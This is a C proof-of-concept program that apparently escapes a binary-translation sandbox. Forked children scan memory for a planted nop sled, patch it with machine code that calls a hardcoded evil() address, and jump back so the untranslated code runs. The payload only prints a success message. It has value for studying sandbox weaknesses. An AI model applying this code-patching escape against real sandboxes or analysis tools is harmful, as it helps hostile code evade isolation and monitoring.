#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define SEARCHWINDOW 500

void evil()
{
 printf("breakout succeeded!\n");
 _exit(0);
}

int main()
{
 char *hint;
 int pid, status, retcode;
 char *tmp;
 int i, j;

 /* allocate shared memory area for parent to pass the hint to the child */
 int *shared_mem=mmap(NULL, 4, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1,0);
 int *shrhint = shared_mem; // pointer to shared memory location of hint

 // initialize *shrhint
 //*shrhint = 0x8040000;
 *shrhint = 0x10000000;

 hint = NULL;
 retcode = 11;

while(retcode == 11)
{
 // increment hint
 *shrhint += SEARCHWINDOW;
 if((*shrhint % 1000000) == 0) printf("hint: %x\n", *shrhint);

 pid = fork(); // fork process

 if (pid < 0) { /* error occurred */
	printf("fork() failed\n");
	return 1;
 }
 else if (pid==0) { /* child process */

modcode: // this nops will be modified so that the untranslated evil() gets called
	asm(
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	"nop;"
	);

	hint = (char*)*shrhint; // get hint from parent

	//if(((int)hint % 1000000) == 0) printf("hint: %x\n", hint);
	//printf("child hint = %x\n", hint);
	//printf("searching for nops...\n");

	// search for 10 consecutive nops
	for(i = 0; i < SEARCHWINDOW; i++)
	{
		for(j = 0; j < 30; j++)
		{
			if(*(hint+i+j) != '\x90') break;
		}
		
		if(j > 29)
		{
			// the nops were found, modify nops and jump to it
			printf("****************************\n");
			printf("30 nops found @ %x\n", (hint+i));

			//printf("sleeping... (%d)\n", (int)getpid());

			//sleep(5);
			//80483c3:       b8 d4 82 04 08          mov    $0x80482d4,%eax
			//80483c8:       ff d0                   call   *%eax
			// evil @ 0x080484a4

			tmp = hint + i;
			*tmp++ = '\xb8';
			*tmp++ = '\xa4';
			*tmp++ = '\x84';
			*tmp++ = '\x04';
			*tmp++ = '\x08';
			*tmp++ = '\xff';
			*tmp++ = '\xd0';

			goto modcode; // this should execute the modified code that calls evil()
			
			return 0;
		}
	}

  return 1;
 }
 else { /* parent process */

	//printf("pid of child: %d\n", pid);
	//if((*shrhint % 1000000) == 0) printf("hint: %x\n", *shrhint);

	wait(&status);

	//printf("child status: %d\n", status);

	retcode = status;
	if(retcode != 11)
	{
		if(retcode == 35584) retcode = 11;
		else if(retcode == 256) retcode = 11;
		else printf("retcode != 11 -> %d\n", retcode);
	}
 }
}

 return 0;
}
